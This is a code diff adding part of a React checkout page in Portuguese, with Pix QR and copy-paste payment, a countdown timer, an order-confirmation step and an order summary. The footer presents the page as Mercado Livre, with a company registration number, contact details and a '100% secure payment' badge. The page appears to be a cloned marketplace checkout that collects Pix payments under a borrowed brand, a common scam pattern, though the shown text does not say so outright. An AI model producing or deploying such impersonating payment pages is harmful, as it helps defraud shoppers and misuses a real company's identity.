+              <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-[#e6f7ed] text-[#006633] rounded-full text-xs font-bold border border-[#b2e5c5]">
+                <QrCode size={14} className="text-[#00a650]" /> Chave Pix Gerada com Sucesso!
+              </div>
+
+              <div>
+                <p className="text-xs text-gray-500">Pague agora para garantir o envio imediato:</p>
+                <div className="text-2xl font-black text-gray-900 mt-0.5">
+                  R$ {totalAmount.toFixed(2).replace(".", ",")}
+                </div>
+              </div>
+
+              {/* QR CODE */}
+              <div className="flex justify-center p-3 bg-white rounded-xl border border-gray-200 shadow-xs max-w-[200px] mx-auto">
+                {pixData.qrcode ? (
+                  <img src={pixData.qrcode} alt="QR Code Pix" className="w-44 h-44 object-contain" />
+                ) : pixData.qrcodeText ? (
+                  <QRCodeSVG value={pixData.qrcodeText} size={176} />
+                ) : (
+                  <div className="w-44 h-44 flex items-center justify-center text-xs text-gray-400">
+                    Carregando QR Code...
+                  </div>
+                )}
+              </div>
+
+              {/* TEMPORIZADOR */}
+              <div className="text-xs text-gray-500 flex items-center justify-center gap-1.5">
+                <Clock3 size={13} className="text-amber-600" />
+                <span>Este código expira em: <strong className="font-mono text-amber-700">{formatCountdown(countdown)}</strong></span>
+              </div>
+
+              {/* PIX COPIA E COLA */}
+              {pixData.qrcodeText && (
+                <div className="space-y-1.5 text-left">
+                  <label className="block text-[11px] font-bold text-gray-600">Código Pix Copia e Cola:</label>
+                  <div className="flex gap-2">
+                    <input
+                      type="text"
+                      readOnly
+                      value={pixData.qrcodeText}
+                      className="w-full px-3 py-2 text-xs bg-gray-50 rounded-lg border border-gray-300 font-mono text-gray-700 outline-none truncate"
+                    />
+                    <button
+                      type="button"
+                      onClick={copyPixCode}
+                      className={`px-4 py-2 rounded-lg font-bold text-xs transition-all flex items-center gap-1 shrink-0 ${
+                        copied ? "bg-[#00a650] text-white" : "bg-[#005BFF] hover:bg-[#004cd6] text-white"
+                      }`}
+                    >
+                      {copied ? <Check size={14} /> : <Copy size={14} />}
+                      {copied ? "Copiado!" : "Copiar"}
+                    </button>
+                  </div>
+                </div>
+              )}
+
+              {/* AUTO POLLING STATUS */}
+              <div className="p-3 bg-blue-50 rounded-xl border border-blue-100 text-xs text-[#005BFF] flex items-center justify-center gap-2">
+                <Loader2 size={14} className="animate-spin text-[#005BFF]" />
+                <span>Aguardando pagamento... <strong>(identificação automática)</strong></span>
+              </div>
+
+              {/* INSTRUÇÕES */}
+              <div className="bg-gray-50 p-3.5 rounded-xl border border-gray-200 text-left space-y-1.5 text-[11px] text-gray-600">
+                <div className="font-bold text-gray-800 text-xs mb-1">Como pagar:</div>
+                <p>1. Abra o aplicativo do seu banco no celular.</p>
+                <p>2. Escolha a opção <strong>Pix</strong> e depois <strong>Pix Copia e Cola</strong> (ou Ler QR Code).</p>
+                <p>3. Cole o código copiado e confirme o pagamento.</p>
+                <p>4. Esta tela atualizará automaticamente assim que for confirmado!</p>
+              </div>
+            </div>
+          )}
+
+          {/* ============================================================
+              ETAPA 5: SUCESSO / COMPRA CONFIRMADA
+             ============================================================ */}
+          {step === 5 && (
+            <div className="bg-white rounded-xl border border-gray-200 p-6 text-center space-y-4 shadow-xs animate-in zoom-in-95 duration-200">
+              <div className="w-16 h-16 bg-[#e6f7ed] text-[#00a650] rounded-full flex items-center justify-center mx-auto shadow-md border-2 border-[#00a650]">
+                <CheckCircle2 size={36} />
+              </div>
+
+              <div>
+                <h3 className="text-lg font-black text-gray-900">🎉 Pagamento Confirmado com Sucesso!</h3>
+                <p className="text-xs text-gray-600 mt-1 max-w-sm mx-auto">
+                  Recebemos seu pedido da <strong>{product.title}</strong>!
+                </p>
+              </div>
+
+              <div className="p-4 bg-gray-50 rounded-xl border border-gray-200 text-left space-y-2 text-xs">
+                <div className="flex justify-between text-gray-600">
+                  <span>Produto:</span>
+                  <strong className="text-gray-900">{product.title}</strong>
+                </div>
+                <div className="flex justify-between text-gray-600">
+                  <span>Cor / Tamanho:</span>
+                  <strong className="text-gray-900">{color.label} (Tam {size} BR)</strong>
+                </div>
+                <div className="flex justify-between text-gray-600">
+                  <span>Total Pago:</span>
+                  <strong className="text-[#00a650] text-sm font-bold">R$ {totalAmount.toFixed(2).replace(".", ",")}</strong>
+                </div>
+                <div className="flex justify-between text-gray-600">
+                  <span>Previsão de Envio:</span>
+                  <strong className="text-gray-900">Mercado Envios Full (Hoje)</strong>
+                </div>
+              </div>
+
+              <p className="text-xs text-gray-500">
+                O comprovante e o código de rastreamento serão enviados para seu WhatsApp e e-mail.
+              </p>
+
+              <button
+                type="button"
+                onClick={onClose}
+                className="w-full py-3 bg-[#005BFF] hover:bg-[#004cd6] text-white font-bold text-xs rounded-lg transition-all shadow cursor-pointer"
+              >
+                Voltar à Página do Produto
+              </button>
+            </div>
+          )}
+
+        </div>
+
+        {/* COLUNA DIREITA: RESUMO DO PEDIDO */}
+        <aside className="space-y-4">
+          <div className="bg-white rounded-xl border border-gray-200 p-4 shadow-xs space-y-4">
+            <h3 className="text-sm font-bold text-gray-900">Resumo do pedido</h3>
+
+            {/* Cupom */}
+            <div className="text-xs">
+              {!showCouponInput ? (
+                <button
+                  type="button"
+                  onClick={() => setShowCouponInput(true)}
+                  className="text-[#005BFF] hover:underline flex items-center gap-1.5 font-medium cursor-pointer"
+                >
+                  <Ticket size={14} />
+                  <span>Inserir cupom de desconto</span>
+                </button>
+              ) : (
+                <div className="flex gap-2">
+                  <input
+                    type="text"
+                    placeholder="CÓDIGO"
+                    value={couponCode}
+                    onChange={(e) => setCouponCode(e.target.value.toUpperCase())}
+                    className="w-full px-2.5 py-1.5 text-xs rounded-lg border border-gray-300 font-mono uppercase"
+                  />
+                  <button
+                    type="button"
+                    onClick={applyCoupon}
+                    className="px-3 py-1.5 bg-gray-900 text-white rounded-lg text-xs font-bold cursor-pointer"
+                  >
+                    Aplicar
+                  </button>
+                </div>
+              )}
+              {couponDiscount > 0 && (
+                <p className="text-[#00a650] text-[11px] font-semibold mt-1">
+                  Cupom aplicado: -R$ {couponDiscount.toFixed(2).replace(".", ",")}
+                </p>
+              )}
+            </div>
+
+            <div className="space-y-1.5 text-xs text-gray-600 border-t border-gray-100 pt-3">
+              <div className="flex justify-between">
+                <span>Produtos</span>
+                <span className="text-gray-900 font-medium">R$ {basePrice.toFixed(2).replace(".", ",")}</span>
+              </div>
+              <div className="flex justify-between text-sm font-bold text-gray-900 pt-2 border-t border-gray-100">
+                <span>Total</span>
+                <span>R$ {totalAmount.toFixed(2).replace(".", ",")}</span>
+              </div>
+            </div>
+
+            {/* Item Card */}
+            <div className="p-3 bg-gray-50 rounded-xl border border-gray-100 flex items-center gap-3">
+              <img
+                src={color.thumb}
+                alt={product.title}
+                className="w-14 h-14 object-cover rounded-lg border border-gray-200 shrink-0"
+              />
+              <div className="min-w-0 flex-1 text-xs">
+                <h4 className="font-semibold text-gray-900 line-clamp-2 leading-tight">
+                  {product.title} - {color.label}
+                </h4>
+                <p className="text-gray-500 text-[11px] mt-0.5">Tamanho {size}</p>
+                <p className="font-bold text-gray-900 mt-1">R$ {product.price / 100 < 50 ? "49,90" : (product.price / 100).toFixed(2).replace(".", ",")}</p>
+              </div>
+            </div>
+          </div>
+        </aside>
+
+      </main>
+
+      {/* ============================================================
+          FOOTER MERCADO LIVRE (FORMAS DE PAGAMENTO & COPYRIGHT)
+         ============================================================ */}
+      <footer className="mt-12 pt-8 pb-12 border-t border-gray-200 text-center space-y-4 text-xs text-gray-500">
+        <div className="space-y-1">
+          <p className="font-bold text-gray-700">Mercado Livre | Todos os direitos reservados</p>
+          <p>Rua Elson Costa, 173 C - Bairro das industrias Belo Horizonte - Minas Gerais</p>
+          <p>© 2026 Mercado Livre - CNPJ: 47.130.874/0001-05</p>
+          <p>Telefone: +55 (11) 3368-5599 / E-mail: suporte@mercadolivre.com.br</p>
+        </div>
+
+        <div className="pt-2">
+          <p className="text-[11px] text-gray-500 mb-2 font-medium">Formas de pagamento:</p>
+          <div className="flex flex-wrap items-center justify-center gap-2 max-w-md mx-auto">
+            <PaymentBadge label="Aura" bg="#ffcc00" text="#000" />
+            <PaymentBadge label="DISCOVER" bg="#f26522" text="#fff" />
+            <PaymentBadge label="Mastercard" bg="#eb001b" text="#fff" />
+            <PaymentBadge label="Diners" bg="#004a98" text="#fff" />
+            <PaymentBadge label="VISA" bg="#1a1f71" text="#fff" />
+            <PaymentBadge label="AMEX" bg="#007bc1" text="#fff" />
+            <PaymentBadge label="PIX" bg="#00a650" text="#fff" />
+            <PaymentBadge label="elo" bg="#000" text="#fff" />
+          </div>
+        </div>
+
+        <div className="flex items-center justify-center gap-1.5 text-[11px] font-bold text-gray-600 pt-2">
+          <Lock size={13} className="text-gray-600" />
+          <span>PAGAMENTO 100% SEGURO</span>
+        </div>
+      </footer>
+    </div>
+  );
+}
+
+function PaymentBadge({ label, bg, text }: { label: string; bg: string; text: string }) {
+  return (
+    <span
+      className="inline-flex items-center justify-center px-2 py-1 rounded text-[10px] font-black tracking-wider shadow-xs border border-gray-200"
+      style={{ backgroundColor: bg, color: text }}
+    >
+      {label}
+    </span>
   );
 }
 
